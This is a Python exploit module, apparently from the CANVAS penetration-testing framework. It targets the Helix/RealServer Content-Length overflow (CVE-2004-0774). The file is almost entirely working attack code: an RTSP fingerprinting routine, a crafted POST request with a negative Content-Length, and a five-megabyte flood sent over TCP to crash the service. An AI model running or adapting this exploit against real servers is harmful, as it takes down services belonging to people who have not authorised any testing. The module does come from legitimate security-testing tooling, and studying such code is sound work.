#! /usr/bin/env python

#
# CANVAS realserver2 Exploit

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")


import os,getopt
import socket
from exploitutils import *
import addencoder
import win32shell
from tcpexploit import tcpexploit
import canvasengine
from canvasengine import socket_save_list
import time
import shellcodeGenerator


NAME="realserver2"
DESCRIPTION="Helix Server Content-Length overflow."
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Real"
DOCUMENTATION["Repeatability"]="Realserver sometimes restarts..."
DOCUMENTATION["VersionsAffected"]="Tested to affect <= 9.0.3"
DOCUMENTATION["CVE Name"] = "CVE-2004-0774"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0774"
DOCUMENTATION['CVSS'] = 7.8


VERSION="1.0"
GTK2_DIALOG="dialog.glade2"


PROPERTY = {}
PROPERTY['TYPE'] = "DoS"


NOTES="""

I believe this may be the one that Sir Mordred (Eviney Denimov) has as well.
    

Breakpoint at 004931f0 to see the routine run out of source space (ESI) and
cause an access violation.

"""

CHANGELOG="""

"""


runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit

    

    

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.port=554
        self.host=""
        self.shellcode="\xcc" * 298
        #hmm, according to 60074207 we only compare with 0, 0d 0a 3f 26 20
        #self.searchbadstring="%.,:;\x00\x0a\x0d+\"\x2f\x5c\x09\x0e\x0b =&~("
        self.searchbadstring="%\x00\x0a\x0d&? 0"
        self.badstring=self.searchbadstring
        self.ssl=0
        self.setVersions()
        self.version=1
        self.name=NAME
        return


    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        #name, jmp esp, writeloc, writable, shelloc
        self.versions[1]=("Windows 2000",0x01020304)


    def test(self):
        self.host=self.target.interface

        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s=self.gettcpsock()
        try:
            self.log("Testing for RealServer at %s:%d"%(self.host,self.port))
            s.connect((self.host, self.port))
        except:
            self.log("Failed to connect.")
            return 0
        
        self.websend(s,"OPTIONS / RTSP/1.0\r\n\r\n")
        data=self.webrecv(s)
        self.log(data)
        if data.find("win32")!=-1:
            self.version=1
            return 1
        if data.find("linux")!=-1:
            self.version=2
            return 1
        
        return 0

    def run(self):
        self.host=self.target.interface
        self.port=self.argsDict.get("port",self.port)
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))

        if self.version==0:
            self.log("Automatic versioning not enabled.")
            self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
            return 0

        self.log("Attacking %s:%d"%(self.host,self.port))
        sploitstring=self.makesploit()
        try:
            s=self.gettcpsock()
            #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.host, self.port))
            self.websend(s,sploitstring)
            time.sleep(1)
            self.websend(s,"B"*5000000)

            data=""
            data+=self.webrecv(s)
            self.log("Attack received: %s"%prettyprint(data))
        except:
            #import traceback
            #traceback.print_exc(file=sys.stdout)
            self.log("Attack reported no open socket - service died?")
            self.setInfo("%s attacking %s:%d - done (failed?)"%(NAME,self.host,self.port))
                    
            return 0
        self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
        return 1
        
    def makesploit(self):
        """
        Construct the attack
        The code might be:
            if (strlen(header)+content_length)>SOMECONSTANT) { return 0 } 
            //otherwise go copy the body into the buffer 
            memcpy(heapbuf,sourcebuf,content_length);
            //the current problem is how to turn this into a normal heap overflow...
            
        """
        out ="POST /SmpDsBhgRl HTTP/1.0\r\n"
        out+="Content-Length: %d\r\n"%(-0x32)
        out+="\r\n"
        out+="A"*5
        
        return out
    
if __name__ == '__main__':
    print "Running CANVAS "+NAME+" version "+VERSION
    app = theexploit()
    ret=standard_callback_commandline(app)

